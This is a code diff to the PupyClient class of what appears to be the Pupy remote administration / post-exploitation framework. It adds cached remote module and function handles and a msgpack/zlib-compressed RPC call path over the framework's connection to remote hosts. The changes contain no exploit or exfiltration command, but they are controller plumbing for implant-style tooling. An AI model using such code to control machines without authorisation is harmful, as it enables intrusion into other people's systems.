@@ -24,6 +24,11 @@ from .PupyJob import PupyJob
 import imp
 import platform
 
+import zlib
+import msgpack
+
+from threading import Lock
+
 from pupylib.PupyCompile import pupycompile
 from pupylib.payloads import dependencies
 from pupylib.utils.rpyc_utils import obtain
@@ -43,6 +48,10 @@ class PupyClient(object):
         self.load_dll = False
         self.new_dlls = False
         self.new_modules = False
+        self.remotes = {}
+        self.remotes_lock = Lock()
+        self.obtain_call = None
+
         self.load_pupyimporter()
 
         #to reuse impersonated handle in other modules
@@ -181,6 +190,38 @@ class PupyClient(object):
             logging.error(e)
         return False
 
+    def remote(self, module, function=None, need_obtain=True):
+        remote_module = None
+        remote_function = None
+
+        with self.remotes_lock:
+            if module in self.remotes:
+                remote_module = self.remotes[module]['_']
+            else:
+                remote_module = getattr(self.conn.modules, module)
+                self.remotes[module] = {
+                    '_': remote_module
+                }
+
+            if function:
+                if function in self.remotes[module]:
+                    remote_function = self.remotes[module][function]
+                else:
+                    remote_function = getattr(self.conn.modules[module], function)
+                    self.remotes[module][function] = remote_function
+
+        if function and need_obtain:
+            if self.obtain_call:
+                return lambda *args, **kwargs: self.obtain_call(remote_function, *args, **kwargs)
+            else:
+                return lambda *args, **kwargs: obtain(remote_function(*args, **kwargs))
+
+        elif function:
+            return remote_function
+
+        else:
+            return remote_module
+
     def load_pupyimporter(self):
         """ load pupyimporter in case it is not """
         if not self.conn.modules.sys.modules.has_key('pupyimporter'):
@@ -195,7 +236,7 @@ class PupyClient(object):
                 'sys.modules["pupyimporter"]=mod',
                 'mod.install()']))
 
-        self.pupyimporter = self.conn.modules.pupyimporter
+        self.pupyimporter = self.remote('pupyimporter')
 
         try:
             self.conn._conn.root.register_cleanup(self.pupyimporter.unregister_package_request_hook)
@@ -213,8 +254,30 @@ class PupyClient(object):
         self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
         self.new_modules = getattr(self.pupyimporter, 'new_modules', None)
 
-        self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
-        self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))
+        remote_obtain_call = getattr(self.conn._conn.root, 'obtain_call', None)
+        if remote_obtain_call:
+            def obtain_call(function, *args, **kwargs):
+                if args or kwargs:
+                    packed_args = msgpack.dumps((args, kwargs))
+                    packed_args = zlib.compress(packed_args)
+                else:
+                    packed_args = None
+
+                result = remote_obtain_call(function, packed_args)
+                result = zlib.decompress(result)
+                result = msgpack.loads(result)
+
+                return result
+
+            self.obtain_call = obtain_call
+
+        if self.obtain_call:
+            self.imported_modules = set(self.obtain_call(self.conn.modules.sys.modules.keys))
+            self.cached_modules = set(self.obtain_call(self.pupyimporter.modules.keys))
+        else:
+            self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
+            self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))
+
 
     def load_dll(self, path):
         """
@@ -331,8 +394,11 @@ class PupyClient(object):
             return False
 
         if forced:
-            for module in forced:
-                self.pupyimporter.invalidate_module(module)
+            with self.remotes_lock:
+                for module in forced:
+                    self.pupyimporter.invalidate_module(module)
+                    if module in self.remotes:
+                        del self.remotes[module]
 
         self.pupyimporter.pupy_add_package(
             packages,
